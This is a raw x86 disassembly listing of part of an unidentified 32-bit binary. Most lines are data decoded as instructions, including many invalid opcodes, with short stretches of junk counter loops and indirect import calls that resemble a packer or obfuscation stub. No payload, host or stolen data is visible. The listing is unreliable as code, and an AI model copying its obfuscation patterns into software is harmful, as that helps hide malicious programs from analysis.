  407409:	sub    ebx,eax
  40740b:	sbb    al,0xe9
  40740d:	ret    
  40740e:	scas   al,BYTE PTR es:[edi]
  40740f:	pop    esp
  407410:	sbb    eax,0x38f31bd
  407415:	popa   
  407416:	pop    ebx
  407417:	aam    0xf3
  407419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40741a:	mov    eax,?
  40741c:	sub    edx,DWORD PTR [edx+0x4e0a0dc1]
  407422:	push   edx
  407423:	jp     0x4073a6
  407425:	adc    edi,DWORD PTR [eax+0x618de63]
  40742b:	sub    ebx,edx
  40742d:	stc    
  40742e:	pushf  
  40742f:	into   
  407430:	es pop esp
  407432:	push   edi
  407433:	neg    cl
  407435:	push   edx
  407436:	push   cs
  407437:	xchg   DWORD PTR [eax+0xb87cfa4],ecx
  40743d:	and    al,0x37
  40743f:	rol    BYTE PTR [ecx-0xf],cl
  407442:	(bad)  
  407443:	int    0xaf
  407445:	xchg   esp,eax
  407446:	mov    WORD PTR [ecx-0x52],?
  407449:	lods   al,BYTE PTR ds:[esi]
  40744a:	mov    dl,0xd9
  40744c:	dec    esi
  40744d:	fidiv  WORD PTR [ebp+edi*4+0x133c24ad]
  407454:	lock imul BYTE PTR [esi+0x4c]
  407458:	jg     0x4073db
  40745a:	adc    DWORD PTR [ecx],edx
  40745c:	(bad)  
  40745d:	(bad)  
  40745e:	pop    eax
  40745f:	dec    BYTE PTR [eax]
  407461:	in     eax,dx
  407462:	outs   dx,DWORD PTR ds:[esi]
  407463:	dec    edx
  407464:	nop
  407465:	mov    al,0x92
  407467:	pop    ds
  407468:	fwait
  407469:	push   ebx
  40746a:	or     DWORD PTR [esi-0x435fd060],ecx
  407470:	add    esi,DWORD PTR [esi+0x47]
  407473:	retf   
  407474:	pop    edx
  407475:	bound  ecx,QWORD PTR [eax]
  407477:	xchg   edi,eax
  407478:	mov    esi,0x5ea44b8e
  40747d:	push   ebx
  40747e:	(bad)  
  40747f:	cdq    
  407480:	inc    esi
  407481:	jbe    0x4074e5
  407483:	in     al,dx
  407484:	and    esi,DWORD PTR [ebp+0x567dd57]
  40748a:	outs   dx,DWORD PTR ds:[esi]
  40748b:	es mov dl,0x21
  40748e:	cmp    eax,0x39d9d489
  407493:	xchg   edi,eax
  407494:	mov    al,0xe
  407496:	in     al,dx
  407497:	out    0xa4,al
  407499:	jo     0x407427
  40749b:	ss sbb eax,0x200dad4a
  4074a1:	mov    ebp,0x979956b4
  4074a6:	test   BYTE PTR [ecx-0x18],ch
  4074a9:	js     0x4074f0
  4074ab:	mov    ds:0x9ac4d912,eax
  4074b0:	xchg   esi,edx
  4074b2:	mov    eax,ds:0xfaf440f0
  4074b7:	jnp    0x40744a
  4074b9:	add    eax,0xa7573d39
  4074be:	pop    edx
  4074bf:	dec    ecx
  4074c0:	nop
  4074c1:	js     0x40748b
  4074c3:	adc    DWORD PTR [ecx],0xd7d2e733
  4074c9:	call   0x8d19:0xb30d63e1
  4074d0:	jae    0x40752c
  4074d2:	lods   eax,DWORD PTR ds:[esi]
  4074d3:	clc    
  4074d4:	jo     0x407538
  4074d6:	fwait
  4074d7:	lods   al,BYTE PTR ds:[esi]
  4074d8:	retf   0x1339
  4074db:	mov    ch,0x50
  4074dd:	dec    ecx
  4074de:	repnz fbld TBYTE PTR [eax+ebp*2-0x78a2ef15]
  4074e6:	fidivr WORD PTR [ebp+0x5e]
  4074e9:	xor    ebx,DWORD PTR [ebp+0x55]
  4074ec:	push   edi
  4074ed:	inc    ebp
  4074ee:	lock sub cl,BYTE PTR [esi+0x319604e3]
  4074f5:	ins    BYTE PTR es:[edi],dx
  4074f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074f7:	mov    WORD PTR [ecx+0x3f],?
  4074fa:	ror    ch,1
  4074fc:	pop    edi
  4074fd:	enter  0xbc33,0xd3
  407501:	inc    ebp
  407502:	inc    eax
  407503:	scas   eax,DWORD PTR es:[edi]
  407504:	sbb    BYTE PTR [ebx],al
  407506:	mov    ds:0x27dee957,eax
  40750b:	out    dx,eax
  40750c:	or     al,0x45
  40750e:	xor    BYTE PTR [eax+0xd],0x6a
  407512:	xchg   ebx,eax
  407513:	xlat   BYTE PTR ds:[ebx]
  407514:	pop    ecx
  407515:	addr16 in eax,dx
  407517:	iret   
  407518:	adc    BYTE PTR [esi+0x2],0x3d
  40751c:	mov    ds,ebp
  40751e:	add    dh,0x17
  407521:	fdiv   st(0),st
  407523:	push   ebp
  407524:	dec    esp
  407525:	xchg   esp,eax
  407526:	add    eax,0x186301b3
  40752b:	dec    edi
  40752c:	xchg   esi,eax
  40752d:	retf   
  40752e:	sub    eax,0x7c0bec34
  407533:	(bad)  
  407534:	pop    ebx
  407535:	stc    
  407536:	loopne 0x4075a6
  407538:	xlat   BYTE PTR ds:[ebx]
  407539:	sahf   
  40753a:	es ja  0x4075b0
  40753d:	inc    edi
  40753e:	scas   eax,DWORD PTR es:[edi]
  40753f:	xchg   edi,eax
  407540:	sar    DWORD PTR [ecx],1
  407542:	scas   al,BYTE PTR es:[edi]
  407543:	pop    ebp
  407544:	adc    al,0xb1
  407546:	mov    eax,0x44994b3f
  40754b:	ds pop ds
  40754d:	(bad)  
  40754e:	xor    al,0x30
  407550:	jae    0x40754d
  407552:	mov    cl,bh
  407554:	pop    esp
  407555:	bound  ecx,QWORD PTR [esi+0x6ebcce4d]
  40755b:	neg    BYTE PTR [eax-0x4445fbfb]
  407561:	push   ebp
  407562:	repz (bad) 
  407564:	mov    ebp,0xafcab4ef
  407569:	inc    DWORD PTR [edx+0x74]
  40756c:	lea    esp,[esi]
  40756e:	and    edi,DWORD PTR [ebp+0x452030db]
  407574:	adc    esp,DWORD PTR [esi+0x5a]
  407577:	cli    
  407578:	js     0x4075b2
  40757a:	mov    ebp,esp
  40757c:	repnz mov ecx,0xb57a25eb
  407582:	out    0x5f,eax
  407584:	adc    DWORD PTR [esi-0x2ce0589a],0x19a7ef5e
  40758e:	sbb    esi,eax
  407590:	jp     0x407513
  407592:	dec    ebp
  407593:	or     eax,0x842d76ad
  407598:	push   esi
  407599:	lahf   
  40759a:	sub    eax,0x45c71dd6
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x4337d3
  4075b4:	sub    DWORD PTR ds:0x43378f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x43377f
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x4337eb,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43378f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43378f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43378f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43378f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43378f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	pop    esi
  407656:	ror    DWORD PTR [edx],0x60
  407659:	adc    eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0x437e7e7c
  407662:	add    eax,0x9f7b2a8a
  407667:	or     DWORD PTR [ebx-0x86e5649],edi
  40766d:	cmp    esi,esp
  40766f:	lods   eax,DWORD PTR ds:[esi]
  407670:	(bad)  
  407671:	out    dx,al
  407672:	ds cmp al,0x55
  407675:	mov    ah,0xc0
  407677:	shr    edx,1
  407679:	sti    
  40767a:	lods   eax,DWORD PTR ds:[esi]
  40767b:	sbb    DWORD PTR [edx],esp
  40767d:	sub    BYTE PTR [edx-0x6b30f649],bh
  407683:	pop    edi
  407684:	add    BYTE PTR [ecx-0x30],ah
  407687:	int3   
  407688:	call   0xf520f051
  40768d:	sbb    esp,esi
  40768f:	cmp    DWORD PTR [edx+0x78],ecx
  407692:	mov    esi,0x3c69dfa3
  407697:	dec    ebp
  407698:	pop    esp
  407699:	out    dx,al
  40769a:	jg     0x4076c6
  40769c:	pushf  
  40769d:	and    dl,bh
  40769f:	(bad)  
  4076a0:	(bad)  
  4076a2:	add    edx,DWORD PTR [ecx+edx*4-0x49]
  4076a6:	cdq    
  4076a7:	icebp  
  4076a8:	loopne 0x407631
  4076aa:	nop
  4076ab:	pop    ebx
  4076ac:	pop    edx
  4076ad:	loope  0x407691
  4076af:	add    al,0xc6
  4076b1:	ja     0x4076d0
  4076b3:	mov    edx,0x2cbcd651
  4076b8:	or     esp,DWORD PTR [edi+0x492bd9df]
  4076be:	push   0x823ff015
  4076c3:	stos   BYTE PTR es:[edi],al
  4076c4:	push   ds
  4076c5:	pop    eax
  4076c6:	cmc    
  4076c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c8:	adc    DWORD PTR [esi+0x26],ecx
  4076cb:	sbb    eax,0x3f1985cf
  4076d0:	mov    esi,0x62158211
  4076d5:	mov    esp,0x6114fa71
  4076da:	and    BYTE PTR [eax+eax*8],0x3b
  4076de:	fiadd  DWORD PTR [edi+0x33906945]
  4076e4:	leave  
  4076e5:	inc    eax
  4076e6:	or     edx,edi
  4076e8:	cmp    al,0xc6
  4076ea:	fdivrp st(7),st
  4076ec:	sub    ch,ah
  4076ee:	dec    ebp
  4076ef:	out    dx,al
  4076f0:	int3   
  4076f1:	repz sub DWORD PTR [ecx-0x354bc46],edx
  4076f8:	dec    esp
  4076f9:	and    ah,BYTE PTR [esi]
  4076fb:	jo     0x40772d
  4076fd:	(bad)  
  4076fe:	test   al,0x1b
  407700:	(bad)  
  407701:	mov    eax,ds:0x8a959fd6
  407706:	std    
  407707:	xor    BYTE PTR cs:[ecx+0x5b646cf2],bh
  40770e:	xchg   esi,eax
  40770f:	lock loope 0x407711
  407712:	rcr    BYTE PTR [edx],1
  407714:	mov    bh,0x98
  407716:	jp     0x4076e8
  407718:	push   es
  407719:	jnp    0x4076c3
  40771b:	enter  0x782f,0x85
  40771f:	int    0x92
  407721:	in     eax,dx
  407722:	fimul  DWORD PTR [eax+0x6325d77b]
  407728:	xchg   ecx,eax
  407729:	xchg   ebx,eax
  40772a:	arpl   WORD PTR [ecx-0x6d47237f],di
  407730:	mov    WORD PTR [edx+0x5ec011f],?
  407736:	inc    esp
  407737:	mov    DWORD PTR [esi+edi*1],eax
  40773a:	arpl   WORD PTR [esi+ebp*1+0x30],bp
  40773e:	data16 sahf 
  407740:	jno    0x4077a1
  407742:	mov    dl,0x2a
  407744:	dec    edx
  407745:	xor    DWORD PTR [esi],ebx
  407747:	add    al,BYTE PTR [esi+0x39]
  40774a:	jmp    0x65b3ef9a
  40774f:	cmp    BYTE PTR [esi],ah
  407751:	daa    
  407752:	(bad)  
  407753:	into   
  407754:	sbb    DWORD PTR [edx-0x4eadcf5b],edx
  40775a:	mov    dl,0x92
  40775c:	push   eax
  40775d:	push   ecx
  40775e:	push   ecx
  40775f:	add    DWORD PTR [eax+0x6d],0x814ba5a4
  407766:	jge    0x407772
  407768:	push   edx
  407769:	pushf  
  40776a:	ror    BYTE PTR [eax],1
  40776c:	loope  0x407731
  40776e:	dec    edx
  40776f:	fwait
  407770:	jo     0x40777d
  407772:	push   ebx
  407773:	push   es
  407774:	loope  0x4077d2
  407776:	rol    dl,cl
  407778:	lods   eax,DWORD PTR ds:[esi]
  407779:	xor    eax,0x83d93c84
  40777e:	imul   ecx,DWORD PTR [ecx+0x3fc10081],0x4d27c0c1
  407788:	adc    ebx,DWORD PTR [eax]
  40778a:	call   0x5f64617c
  40778f:	(bad)  
  407790:	retf   
  407791:	pop    eax
  407792:	sbb    BYTE PTR [edx+0x4d7d4e93],cl
  407798:	cmp    DWORD PTR [esi],edx
  40779a:	add    al,0x4
  40779c:	mov    bl,0xa6
  40779e:	sub    DWORD PTR [ebp+0x23],ecx
  4077a1:	je     0x407725
  4077a3:	and    BYTE PTR [ebx+eax*8-0x2c1b6d67],bh
  4077aa:	mov    dh,0xba
  4077ac:	adc    BYTE PTR [ecx],0x48
  4077af:	aad    0xdd
  4077b1:	loope  0x407777
  4077b3:	sbb    eax,0x9ffcd4b2
  4077b8:	mov    ecx,0x67359712
  4077bd:	sub    eax,0xbb3d5f2a
  4077c2:	daa    
  4077c3:	push   esi
  4077c4:	mov    bl,0x5c
  4077c6:	clc    
  4077c7:	enter  0xe4c0,0x5b
  4077cb:	jg     0x407813
  4077cd:	icebp  
  4077ce:	adc    eax,0x67e0e1cf
  4077d3:	test   BYTE PTR [ecx-0x5d],dh
  4077d6:	nop
  4077d7:	rcr    DWORD PTR [eax-0x5deb5bd0],1
  4077dd:	icebp  
  4077de:	fisubr WORD PTR [edx]
  4077e0:	sti    
  4077e1:	mov    esi,ebx
  4077e3:	mov    edi,0x2dba9cf9
  4077e8:	mov    dh,0x19
  4077ea:	test   eax,0x72b88551
  4077ef:	test   al,0x6
  4077f1:	shr    BYTE PTR [esi],0xec
  4077f4:	jmp    0x9b37a18c
  4077f9:	cvtps2pi mm4,QWORD PTR [ecx-0x1a]
  4077fd:	sub    BYTE PTR [ecx],dh
  4077ff:	mov    cs,WORD PTR [ebx-0x50c51d4c]
  407805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407806:	xchg   esp,eax
  407807:	sub    esi,ebp
  407809:	scas   al,BYTE PTR es:[edi]
  40780a:	mov    ebp,esi
  40780c:	mov    DWORD PTR [eax-0x63],ebx
  40780f:	test   DWORD PTR [ebx-0x80],eax
  407812:	mov    ebx,0xcf3a91dc
  407817:	(bad)  
  407818:	cli    
  407819:	xchg   esi,eax
  40781a:	lods   al,BYTE PTR ds:[esi]
  40781b:	xor    eax,0x66102447
  407820:	pop    ebx
  407821:	xor    ch,BYTE PTR [ebx+0x1d21e842]
  407827:	daa    
  407828:	mov    dh,0xe8
  40782a:	jecxz  0x407828
  40782c:	inc    esi
  40782d:	pop    ebp
  40782e:	xchg   ebx,eax
  40782f:	push   0xffffff80
  407831:	inc    ebp
  407832:	jbe    0x4077da
  407834:	jb     0x407868
  407836:	fs dec esp
  407838:	repz pop eax
  40783a:	aas    
  40783b:	sub    eax,0x6bc6ab53
  407840:	ins    BYTE PTR es:[edi],dx
  407841:	cdq    
  407842:	sbb    bl,dh
  407844:	or     ch,BYTE PTR [ebp+ebx*1+0x7490441a]
  40784b:	les    esp,FWORD PTR [edi-0x204317ed]
  407851:	ror    BYTE PTR [edx+0x76],cl
  407854:	xchg   esi,eax
  407855:	xchg   ebx,eax
  407856:	(bad)  
  407857:	daa    
  407858:	jnp    0x40780e
  40785a:	sbb    DWORD PTR [eax-0x6976a4],edx
  407860:	enter  0x247d,0x68
  407864:	(bad)  
  407866:	into   
  407867:	fwait
  407868:	pop    es
  407869:	sbb    al,0x6c
  40786b:	sbb    DWORD PTR [esi+0x2b],edx
  40786e:	into   
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x43377f,0x4337e3
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43389b,0x12
  40788b:	cmp    DWORD PTR ds:0x43389b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43389b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43389b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43389b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43381f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43381f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43381f,esi
  4078e0:	cmp    DWORD PTR ds:0x43381f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43381f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x24,eax
  407922:	sti    
  407923:	das    
  407924:	mov    dh,0x24
  407926:	into   
  407927:	jle    0x4079a7
  407929:	add    eax,0xbf7e7e7c
  40792e:	ror    DWORD PTR [eax],1
  407930:	inc    esp
  407931:	loope  0x4078ef
  407933:	or     DWORD PTR [edi+0xa09c294],eax
  407939:	sbb    eax,0xb0710b68
  40793e:	dec    esp
  40793f:	xchg   DWORD PTR [ecx+0x7f243b16],esi
  407945:	aaa    
  407946:	sub    ch,BYTE PTR [edx]
  407948:	add    eax,DWORD PTR [ebp-0x62]
  40794b:	lds    esi,FWORD PTR [edi]
  40794d:	inc    edi
  40794e:	sub    esi,ecx
  407950:	popa   
  407951:	xchg   BYTE PTR [ebp-0x32],ch
  407954:	inc    ebp
  407955:	aaa    
  407956:	data16 mov dh,ch
  407959:	and    edx,0x4e
  40795c:	fnstsw WORD PTR [ecx+0x7018ea5e]
  407962:	xchg   esp,eax
  407963:	repnz gs xchg ecx,eax
  407966:	cld    
  407967:	or     esp,edx
  407969:	cli    
  40796a:	mov    fs,WORD PTR [edx+0x5f]
  40796d:	jnp    0x407993
  40796f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407970:	lock sbb BYTE PTR [ebx],ch
  407973:	(bad)  
  407974:	pop    ebp
  407975:	cli    
  407976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407977:	xor    bh,BYTE PTR [edx-0x7]
  40797a:	outs   dx,DWORD PTR ds:[esi]
  40797b:	pop    ecx
  40797c:	mov    esp,0x76f2211b
  407981:	retf   
  407982:	jno    0x407930
  407984:	repz lahf 
  407986:	inc    ecx
  407987:	dec    ebx
  407988:	push   ss
  407989:	jle    0x40794a
  40798b:	mov    cl,BYTE PTR [ecx]
  40798d:	xor    cl,ch
  40798f:	sbb    DWORD PTR [eax-0x5edf207b],ebp
  407995:	cmc    
  407996:	and    edx,ecx
  407998:	ret    0x50f
  40799b:	jo     0x4079ea
  40799d:	int3   
  40799e:	popf   
  40799f:	add    ebx,ecx
  4079a1:	aaa    
  4079a2:	jbe    0x407959
  4079a4:	aam    0xd3
  4079a6:	inc    ecx
  4079a7:	cmc    
  4079a8:	jmp    0x24bfc28b
  4079ad:	and    al,BYTE PTR [ebx]
  4079af:	mov    ax,ds:0x66e5277
  4079b5:	xchg   esp,eax
  4079b6:	cwde   
  4079b7:	mov    bh,0x11
  4079b9:	cwde   
  4079ba:	fs xor ecx,esi
  4079bd:	ins    BYTE PTR es:[edi],dx
  4079be:	inc    edi
  4079bf:	xor    bh,BYTE PTR [esp+eax*2+0x13]
  4079c3:	jg     0x4079ff
  4079c5:	ret    0xfb46
  4079c8:	fadd   st(5),st
  4079ca:	pop    ss
  4079cb:	push   edi
  4079cc:	cmp    BYTE PTR [eax+edi*4],bh
  4079cf:	fistp  WORD PTR [ecx]
  4079d1:	inc    edi
  4079d2:	xchg   esi,eax
  4079d3:	push   ecx
  4079d4:	aad    0x94
  4079d6:	mov    ch,0x84
  4079d8:	imul   esp,DWORD PTR [eax],0xd3f1a7a4
  4079de:	int    0xb7
  4079e0:	mov    dl,0x42
  4079e2:	fs in  al,0x56
  4079e5:	in     eax,dx
  4079e6:	xchg   DWORD PTR [eax+0x587f89b5],ebp
  4079ec:	stos   BYTE PTR es:[edi],al
  4079ed:	fcmovne st,st(6)
  4079ef:	mov    eax,0x47f17b80
  4079f4:	sbb    BYTE PTR [ecx-0x6001696e],dh
  4079fa:	scas   al,BYTE PTR es:[edi]
  4079fb:	jo     0x4079bf
  4079fd:	xchg   ebx,eax
  4079fe:	jb     0x40798f
  407a00:	hlt    
  407a01:	imul   ecx,DWORD PTR [ebx+0x3],0xffffff81
  407a05:	pop    ss
  407a06:	inc    ecx
  407a07:	sub    ebp,eax
  407a09:	into   
  407a0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a0c:	jp     0x4079ea
  407a0e:	shl    DWORD PTR [ecx+0x78eeece7],1
  407a14:	shl    ebx,cl
  407a16:	fsubp  st(2),st
  407a18:	inc    edi
  407a19:	lods   eax,DWORD PTR ds:[esi]
  407a1a:	call   0xe269:0x1aa97825
  407a21:	or     al,0x10
  407a23:	mov    ecx,0xee2dbdb9
  407a28:	cdq    
  407a29:	test   al,0x79
  407a2b:	sub    eax,0xd4b906d
  407a30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a31:	(bad)  
  407a32:	shr    eax,cl
  407a34:	pop    ecx
  407a35:	and    eax,DWORD PTR [ebx-0x56]
  407a38:	ret    
  407a39:	xor    al,0xaa
  407a3b:	fistp  DWORD PTR [ecx]
  407a3d:	stos   BYTE PTR es:[edi],al
  407a3e:	or     edi,esi
  407a40:	pop    esp
  407a41:	loopne 0x407a28
  407a43:	inc    ebx
  407a44:	dec    esi
  407a45:	jecxz  0x407ab9
  407a47:	(bad)  
  407a48:	and    DWORD PTR [esi],ebp
  407a4a:	pusha  
  407a4b:	sti    
  407a4c:	sar    DWORD PTR ds:0x28d76362,cl
  407a52:	fwait
  407a53:	mov    BYTE PTR [eax+0x7c],dh
  407a56:	cwde   
  407a57:	pop    ds
  407a58:	aas    
  407a59:	repz fcomp DWORD PTR [ebp-0xe]
  407a5d:	mov    esi,0x972e6641
  407a62:	and    al,0xc8
  407a64:	les    esp,FWORD PTR [ebp-0x2e78ecf5]
  407a6a:	jmp    0x4079ec
  407a6c:	jg     0x407a9f
  407a6e:	fs sti 
  407a70:	cmp    dl,BYTE PTR [ebx+0x3e]
  407a73:	fcom   QWORD PTR [edx]
  407a75:	imul   ebx,DWORD PTR [edx+0x5f673edb],0x13
  407a7c:	fdivr  st,st(6)
  407a7e:	into   
  407a7f:	xor    BYTE PTR [ebp+ebx*8+0x2a],cl
  407a83:	test   eax,0x683ecead
  407a88:	sub    DWORD PTR [eax*4-0x2c31764e],esp
  407a8f:	leave  
  407a90:	add    DWORD PTR [edx],esi
  407a92:	xchg   BYTE PTR [eax],ah
  407a94:	mov    al,0xdb
  407a96:	dec    edi
  407a97:	mov    bh,0xc8
  407a99:	stos   BYTE PTR es:[edi],al
  407a9a:	mov    BYTE PTR [ebx+edi*8],dl
  407a9d:	shl    BYTE PTR [edi-0x588a5f8b],1
  407aa3:	shl    BYTE PTR [ecx],0xec
  407aa6:	mov    eax,ebx
  407aa8:	xchg   ecx,eax
  407aa9:	rcr    dl,cl
  407aab:	mov    ebx,0x6cc8eb8a
  407ab0:	cmp    eax,0x4386ca37
  407ab5:	ins    DWORD PTR es:[edi],dx
  407ab6:	mov    eax,0xc25fedf6
  407abb:	dec    ecx
  407abc:	xor    ebx,DWORD PTR [edx]
  407abe:	dec    eax
  407abf:	aas    
  407ac0:	loope  0x407a7b
  407ac2:	loope  0x407a80
  407ac4:	addr16 cld 
  407ac6:	jae    0x407ab8
  407ac8:	sar    BYTE PTR [edi+0x4e],cl
  407acb:	ror    DWORD PTR [edi-0x1c],cl
  407ace:	mov    esi,0x67c906b4
  407ad3:	push   ss
  407ad4:	dec    ebx
  407ad5:	inc    esp
  407ad6:	lock in eax,0xa8
  407ad9:	pop    ecx
  407ada:	and    ch,BYTE PTR [ebp-0x132df352]
  407ae0:	push   es
  407ae1:	fstp   DWORD PTR [esi+0x63]
  407ae4:	or     al,0xe6
  407ae6:	jmp    WORD PTR [esi+0x1043768e]
  407aed:	jmp    0x407a81
  407aef:	xor    al,BYTE PTR [eax-0x24f098b8]
  407af5:	pusha  
  407af6:	mov    dx,0xd3d6
  407afa:	pushf  
  407afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407afc:	jb     0x407ac8
  407afe:	or     al,0xf4
  407b00:	loope  0x407b5b
  407b02:	pusha  
  407b03:	xor    cl,cl
  407b05:	add    al,BYTE PTR [edi+0x6f]
  407b08:	or     ch,BYTE PTR [esi+0x56]
  407b0b:	sbb    BYTE PTR [esp+eax*4],dl
  407b0e:	fs xchg edi,eax
  407b10:	mov    ch,0x94
  407b12:	ins    BYTE PTR es:[edi],dx
  407b13:	shr    BYTE PTR [edi+0x53],cl
  407b16:	cs mov cl,0x1c
  407b19:	hlt    
  407b1a:	retf   
  407b1b:	push   0x3c9a3a4f
  407b20:	aad    0x44
  407b22:	fistp  WORD PTR [esi-0x11]
  407b25:	sbb    esp,eax
  407b27:	(bad)  
  407b28:	stc    
  407b29:	dec    edx
  407b2a:	mov    dh,0xdc
  407b2c:	das    
  407b2d:	inc    eax
  407b2e:	and    eax,0xd669d537
  407b33:	outs   dx,BYTE PTR ds:[esi]
  407b34:	pop    edx
  407b35:	outs   dx,BYTE PTR ds:[esi]
  407b36:	(bad)  
  407b38:	xor    eax,ecx
  407b3a:	adc    DWORD PTR ds:0x43382b,0x1c6e
  407b44:	mov    esi,0x32729b
  407b49:	mov    DWORD PTR ds:0x4337d3,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433787,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x4338af,0x43378f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43381f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433783
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x433827,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43379f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x4337eb,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x4337eb,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x433857
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x4337d7,0x11
  407bd9:	cmp    DWORD PTR ds:0x4337d7,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x4337d7,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x4337d7,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x4337d7
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x4337d7,edx
  407c1f:	mov    edx,DWORD PTR ds:0x4337d7
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x4337d7,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	ja     0x407cb2
  407c4c:	adc    DWORD PTR [edi],0x7e7ecc2b
  407c52:	add    eax,0xa77e7e7c
  407c57:	aaa    
  407c58:	sbb    BYTE PTR [edi],al
  407c5a:	lahf   
  407c5b:	mov    eax,0x1b05c559
  407c60:	in     al,dx
  407c61:	push   ss
  407c62:	stc    
  407c63:	xor    ch,dh
  407c65:	pop    edx
  407c66:	and    al,0x7b
  407c68:	stos   DWORD PTR es:[edi],eax
  407c69:	lock sar DWORD PTR [edx-0x3f7003bf],cl
  407c70:	or     edi,esp
  407c72:	xor    edi,0xffffff9e
  407c75:	scas   al,BYTE PTR es:[edi]
  407c76:	and    BYTE PTR ds:0x2dc08f14,bh
  407c7c:	in     al,0x8
  407c7e:	into   
  407c7f:	pop    ds
  407c80:	jecxz  0x407c78
  407c82:	push   eax
  407c83:	mov    al,0xf7
  407c85:	lods   eax,DWORD PTR ds:[esi]
  407c86:	mov    dl,0xd9
  407c88:	cmp    ah,cl
  407c8a:	fistp  WORD PTR [eax]
